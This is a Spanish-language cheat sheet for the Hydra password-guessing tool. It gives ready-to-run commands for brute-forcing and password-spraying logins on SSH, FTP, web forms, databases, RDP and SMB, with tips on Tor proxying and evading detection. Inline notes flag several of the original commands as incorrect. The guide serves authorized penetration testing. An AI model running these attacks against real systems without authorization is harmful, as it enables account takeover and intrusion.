# 🔓 Hydra - Guía de referencia completa

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  _   _           _           
 | | | |_   _  __| |_ __ __ _ 
 | |_| | | | |/ _` | '__/ _` |
 |  _  | |_| | (_| | | | (_| |
 |_| |_|\__, |\__,_|_|  \__,_|
        |___/                  
    La herramienta rápida para probar credenciales de red
```

<p align="center">
  <img src="https://img.shields.io/badge/Hydra-Password_Cracker-red?style=for-the-badge" alt="Hydra">
  <img src="https://img.shields.io/badge/Brute-Force-orange?style=for-the-badge" alt="Fuerza bruta">
  <img src="https://img.shields.io/badge/50+-Protocols-blue?style=for-the-badge" alt="Protocolos">
  <img src="https://img.shields.io/badge/Network-Login-green?style=for-the-badge" alt="Red">
</p>

<p align="center">
  <b>🔑 La herramienta más conocida de pruebas de credenciales de red en paralelo</b>
</p>

---

## 📋 Índice

- [Introducción](#-introducción)
- [Instalación](#-instalación)
- [Sintaxis básica](#-sintaxis-básica)
- [Protocolos compatibles](#-protocolos-compatibles)
- [Ataques SSH](#-ataques-ssh)
- [Ataques FTP](#-ataques-ftp)
- [Ataques a formularios HTTP](#-ataques-a-formularios-http)
- [Ataques a bases de datos](#-ataques-a-bases-de-datos)
- [Ataques a escritorios remotos](#-ataques-a-escritorios-remotos)
- [Otros servicios](#-otros-servicios)
- [Listas de palabras y contraseñas](#-listas-de-palabras-y-contraseñas)
- [Opciones avanzadas](#-opciones-avanzadas)
- [Ejemplos prácticos](#-ejemplos-prácticos)
- [Referencia rápida](#-referencia-rápida)
- [Consejos y buenas prácticas](#-consejos-y-buenas-prácticas)
- [Recursos](#-recursos)

---

## 🎯 Introducción

Password spraying prueba una misma contraseña contra varias cuentas. Credential stuffing reutiliza pares de credenciales ya conocidos. Las pruebas en línea consultan el servicio real, por lo que difieren del cracking sin conexión de hashes.

**Hydra** (THC-Hydra) es una herramienta rápida y flexible para probar contraseñas contra servicios en línea. Admite numerosos protocolos y realiza conexiones en paralelo para aumentar la velocidad.

### Funciones principales

| Función | Descripción |
|---------|-------------|
| **Más de 50 protocolos** | SSH, FTP, HTTP, RDP, SMB y otros |
| **Ejecución en paralelo** | Varias conexiones simultáneas |
| **Flexible** | Cabeceras personalizadas, cookies y proxy |
| **Reanudación** | Guardar y restaurar sesiones de ataque |
| **Multiplataforma** | Linux, Windows, macOS |

### Tipos de ataque

| Tipo | Descripción |
|------|-------------|
| **Diccionario** | Probar contraseñas de una lista de palabras |
| **Fuerza bruta** | Generar todas las combinaciones |
| **Password spraying** | Una contraseña y varios usuarios |
| **Credential stuffing** | Pares de usuario y contraseña |

---

## 📥 Instalación

### Kali Linux (preinstalado)
```bash
hydra -h
```

### Ubuntu/Debian
```bash
sudo apt install hydra
```

### Desde el código fuente
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

### macOS (Homebrew)
```bash
brew install hydra
```

### Verificar la instalación

> **Precisión:** `-V` muestra los pares probados; no es una opción para consultar la versión. La disponibilidad de módulos depende de la compilación y sus bibliotecas.
```bash
hydra -h
hydra -V
```

---

<a id="-sintaxis-básica"></a>
## ⌨️ Sintaxis básica

### Sintaxis general
```bash
hydra [options] target service
```

### Opciones habituales

| Opción | Descripción |
|--------|-------------|
| `-l` | Un nombre de usuario |
| `-L` | Lista de usuarios |
| `-p` | Una contraseña |
| `-P` | Lista de contraseñas |
| `-C` | Archivo separado por dos puntos (user:pass) |
| `-t` | Hilos (predeterminado: 16) |
| `-s` | Número de puerto |
| `-o` | Archivo de salida |
| `-f` | Detenerse al encontrar el primer par válido |
| `-V` | Modo detallado |
| `-vV` | Muy detallado |
| `-d` | Modo de depuración |

### Inicio rápido
```bash
# Un usuario y una lista de contraseñas
hydra -l admin -P passwords.txt target ssh

# Una lista de usuarios y una contraseña
hydra -L users.txt -p password123 target ssh

# Ambas listas
hydra -L users.txt -P passwords.txt target ssh
```

---

## 📡 Protocolos compatibles

### Lista completa de protocolos

```
adam6500    afp         asterisk    cisco       cisco-enable
cvs         firebird    ftp         ftps        http-form-get
http-form-post          http-get    http-head   http-post
http-proxy  http-proxy-urlenum      https-form-get
https-form-post         https-get   https-head  https-post
imap        imaps       irc         ldap2       ldap2s
ldap3       ldap3-crammd5           ldap3-digestmd5
ldap3s      ldap3s-crammd5          ldap3s-digestmd5
memcached   mongodb     mssql       mysql       nntp
oracle      oracle-listener         oracle-sid  pcanywhere
pcnfs       pop3        pop3s       postgres    radmin2
rdp         redis       rexec       rlogin      rpcap
rsh         rtsp        s7-300      sapr3       sip
smb         smtp        smtp-enum   smtps       snmp
socks5      ssh         sshkey      svn         teamspeak
telnet      vmauthd     vnc         xmpp
```

---

## 🔐 Ataques SSH

### Ataque SSH básico
```bash
# Un usuario
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Varios usuarios
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Puerto concreto
hydra -l admin -P passwords.txt -s 2222 192.168.1.1 ssh
```

### SSH con opciones

> **Bloqueo de cuentas:** `-t 4` limita las tareas en paralelo, no el total de intentos, y no garantiza evitar bloqueos.
```bash
# Limitar los intentos (evitar el bloqueo)
hydra -l admin -P passwords.txt -t 4 192.168.1.1 ssh

# Detenerse al primer resultado válido
hydra -l admin -P passwords.txt -f 192.168.1.1 ssh

# Salida detallada
hydra -l admin -P passwords.txt -V 192.168.1.1 ssh
```

### Autenticación SSH mediante claves

> **Corrección del ejemplo:** `sshkey` espera archivos de clave privada; generar cadenas mediante `-x` no equivale a probar claves SSH válidas. Véase el [módulo oficial sshkey](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-sshkey.c).
```bash
# Usar una clave privada (comprobar claves débiles)
hydra -l root -x 6:8:a 192.168.1.1 sshkey
```

---

## 📂 Ataques FTP

### Ataque FTP básico
```bash
# Fuerza bruta FTP
hydra -l admin -P passwords.txt ftp://192.168.1.1

# Comprobación de FTP anónimo
hydra -l anonymous -p anonymous ftp://192.168.1.1

# Varios usuarios
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### FTPS (FTP sobre SSL)
```bash
hydra -l admin -P passwords.txt ftps://192.168.1.1
```

---

## 🌐 Ataques a formularios HTTP

### HTTP-GET-FORM

```bash
hydra -l admin -P passwords.txt target http-get-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# Formato:
# "/path:params:failure_string"
```

### HTTP-POST-FORM (el más habitual)

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

### Sintaxis del ataque a formularios

```
"/page:POST_params:Failure_string"

Donde:
- ^USER^ = Marcador del nombre de usuario
- ^PASS^ = Marcador de la contraseña
- Failure_string = Texto que aparece cuando falla el inicio de sesión
```

### Detección basada en el éxito

```bash
# Usar S= para una cadena de éxito en lugar de una de fallo
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

### Con cookies

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"
```

### Autenticación HTTP Basic

```bash
# Autenticación HTTP Basic
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin/

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.1/admin/
```

### Proxy HTTP

```bash
hydra -l admin -P passwords.txt http-proxy://proxy.server:3128
```

---

<a id="-ataques-a-bases-de-datos"></a>
## 🗄️ Ataques a bases de datos

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1

# Puerto concreto
hydra -l root -P passwords.txt -s 3307 192.168.1.1 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

### Microsoft SQL Server

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.1
```

### Oracle

```bash
# Ataque al SID de Oracle
hydra -l SYS -P passwords.txt oracle://192.168.1.1/SID

# Listener de Oracle
hydra -l admin -P passwords.txt oracle-listener://192.168.1.1
```

### MongoDB

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

### Redis

```bash
hydra -P passwords.txt redis://192.168.1.1
```

---

<a id="-ataques-a-escritorios-remotos"></a>
## 🖥️ Ataques a escritorios remotos

### RDP (Escritorio remoto de Windows)

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# Limitar los hilos (RDP es lento)
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

### VNC

```bash
# VNC (solo contraseña)
hydra -P passwords.txt vnc://192.168.1.1

# Versión concreta de VNC
hydra -P passwords.txt -s 5901 192.168.1.1 vnc
```

### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

## 🔧 Otros servicios

### SMB (recursos compartidos de Windows)

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

### SMTP

```bash
# Autenticación SMTP
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.1

# Enumeración SMTP
hydra -L users.txt smtp-enum://192.168.1.1
```

### POP3/IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.1

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.1
```

### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap://192.168.1.1
```

### SNMP

```bash
hydra -P community_strings.txt snmp://192.168.1.1
```

---

## 📚 Listas de palabras y contraseñas

### Listas de palabras habituales

```bash
# Ubicaciones en Kali Linux
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Passwords/

# Contraseñas de SecLists
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

### Generación de contraseñas (-x)

> **Conjunto de caracteres:** `a`, `A` y `1` son clases especiales de `-x`; otros caracteres se interpretan literalmente. El `!` del comentario original no representa automáticamente todos los símbolos.

```bash
# Generar contraseñas: min:max:charset
hydra -l admin -x 4:6:a 192.168.1.1 ssh    # 4-6 letras minúsculas
hydra -l admin -x 4:6:A 192.168.1.1 ssh    # 4-6 letras mayúsculas
hydra -l admin -x 4:6:1 192.168.1.1 ssh    # 4-6 números
hydra -l admin -x 4:6:aA1 192.168.1.1 ssh  # Combinación de caracteres

# Opciones del conjunto de caracteres:
# a = minúsculas    A = mayúsculas
# 1 = números      ! = caracteres especiales
```

### Archivo separado por dos puntos (-C)

```bash
# Formato user:password
hydra -C creds.txt 192.168.1.1 ssh

# creds.txt:
# admin:admin
# admin:password
# root:toor
# guest:guest
```

### Personalización de usuarios y contraseñas

```bash
# Contraseñas vacías
hydra -l admin -e n 192.168.1.1 ssh

# Probar el nombre de usuario como contraseña
hydra -l admin -e s 192.168.1.1 ssh

# Probar el nombre de usuario invertido como contraseña
hydra -l admin -e r 192.168.1.1 ssh

# Todas las comprobaciones especiales
hydra -l admin -e nsr -P passwords.txt 192.168.1.1 ssh
```

---

## ⚡ Opciones avanzadas

### Salida y registro

```bash
# Guardar los resultados en un archivo
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

# Salida JSON
hydra -l admin -P passwords.txt -o results.json -b json 192.168.1.1 ssh
```

### Reanudar ataques

> **Corrección:** `-R` restaura una sesión existente; no sirve para iniciar una nueva sesión «guardándola». El primer comando del ejemplo mezcla ambos conceptos.

```bash
# Guardar la sesión para reanudarla
hydra -l admin -P large_wordlist.txt -o results.txt -R 192.168.1.1 ssh

# Reanudar un ataque interrumpido
hydra -R
```

### Compatibilidad con proxy

```bash
# Proxy HTTP
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# Proxy SOCKS
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```

### Ajuste del rendimiento

> **Opciones:** los comentarios del original confunden `-w` (tiempo de espera de respuesta) con un retardo entre intentos, y `-T` (límite global de tareas) con un timeout. `-W` controla la espera entre conexiones por tarea. Consulta la [ayuda del código oficial](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).

```bash
# Hilos (predeterminado: 16)
hydra -l admin -P passwords.txt -t 32 192.168.1.1 ssh

# Tiempo de espera entre intentos
hydra -l admin -P passwords.txt -w 10 192.168.1.1 ssh

# Tiempo de espera de la conexión
hydra -l admin -P passwords.txt -T 30 192.168.1.1 ssh
```

### Varios objetivos

```bash
# Desde un archivo
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt:
# 192.168.1.1
# 192.168.1.2
# 192.168.1.3
```

---

## 🎬 Ejemplos prácticos

### Ejemplo 1: Fuerza bruta SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V 192.168.1.1 ssh
```

### Ejemplo 2: Formulario de acceso web
```bash
hydra -l admin -P passwords.txt \
    192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"
```

### Ejemplo 3: Inicio de sesión de WordPress
```bash
hydra -l admin -P passwords.txt \
    target.com http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

### Ejemplo 4: Varios servicios

> **Sintaxis:** Hydra selecciona un módulo de servicio por ejecución. Añadir `ssh ftp mysql` no constituye una lista válida para probar tres servicios en un solo comando. Se conserva el ejemplo original.
```bash
# Probar varios servicios de un equipo
hydra -l admin -P passwords.txt 192.168.1.1 ssh ftp mysql
```

### Ejemplo 5: Password spraying
```bash
hydra -L users.txt -p "Winter2024!" \
    192.168.1.1 smb
```

### Ejemplo 6: Con proxy/Tor
```bash
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
```

### Ejemplo 7: Autenticación HTTP Basic (panel de administración)
```bash
hydra -l admin -P passwords.txt \
    https-get://192.168.1.1/admin/
```

### Ejemplo 8: Ataque RDP (¡precaución!)
```bash
hydra -l administrator -P passwords.txt \
    -t 1 -V rdp://192.168.1.1
```

---

## 📊 Referencia rápida

### Comandos esenciales

| Tarea | Comando |
|------|---------|
| Ataque SSH | `hydra -l user -P pass.txt ssh://target` |
| Ataque FTP | `hydra -l user -P pass.txt ftp://target` |
| Formulario HTTP POST | `hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:Failed"` |
| Ataque RDP | `hydra -l user -P pass.txt rdp://target` |
| Guardar la salida | `hydra ... -o results.txt` |
| Reanudar el ataque | `hydra -R` |

### Opciones habituales

| Opción | Descripción |
|--------|-------------|
| `-l/-L` | Usuario/lista |
| `-p/-P` | Contraseña/lista |
| `-C` | Archivo user:pass |
| `-t` | Hilos |
| `-s` | Puerto |
| `-f` | Detenerse al obtener un resultado válido |
| `-V` | Detallado |
| `-o` | Archivo de salida |
| `-x` | Generar contraseñas |
| `-e nsr` | Probar contraseña vacía, igual al usuario e invertida |

---

## 💡 Consejos y buenas prácticas

### Consejos de rendimiento

1. **Limitar los hilos en servicios sensibles**
   ```bash
   # RDP y SMB: usar pocos hilos
   hydra -t 1 ...
   
   # SSH: cantidad moderada
   hydra -t 4 ...
   
   # Formularios web: puede ser mayor
   hydra -t 16 ...
   ```

2. **Usar listas de palabras específicas**
   ```bash
   # Mejor que rockyou.txt:
   # - Las 1000 contraseñas más habituales
   # - Credenciales predeterminadas
   # - Específicas de la organización
   ```

3. **Comprobar primero las políticas de bloqueo**
   ```bash
   # Probar primero con una lista pequeña
   hydra -l admin -P small.txt -t 1 target ssh
   ```

### Consejos de discreción

```bash
# Añadir retardos
hydra -l admin -P passwords.txt -w 30 target ssh

# Pocos hilos
hydra -l admin -P passwords.txt -t 2 target ssh

# Mediante un proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
```

---

## ⚠️ Aviso legal

> **ADVERTENCIA:** Hydra es una herramienta de ataque potente que debe usarse únicamente para **pruebas autorizadas**.
> 
> - ✅ Realizar pruebas en sistemas propios
> - ✅ Realizar pruebas con permiso explícito por escrito
> - ✅ Usar en pruebas de penetración autorizadas
> - ❌ Nunca atacar sin autorización
> - ❌ La fuerza bruta sin permiso es ilegal
> 
> **Los intentos de acceso no autorizado son ilegales y pueden dar lugar a cargos penales.**

---

## 📚 Recursos

### Recursos oficiales
- [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Manual de Hydra](https://github.com/vanhauser-thc/thc-hydra/blob/master/README)

### Listas de palabras
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Credenciales predeterminadas](https://github.com/ihebski/DefaultCreds-cheat-sheet)

### Guías de referencia relacionadas
- [Nmap](../../Nmap/translations/README.es.md)
- [Metasploit](../../Metasploit/translations/README.es.md)
- [SQLMap](../../SQLMap/translations/README.es.md)

---

<p align="center">
  <b>🔓 ¡Domina las pruebas de credenciales de red!</b><br>
  <i>Obtén siempre autorización antes de empezar</i>
</p>
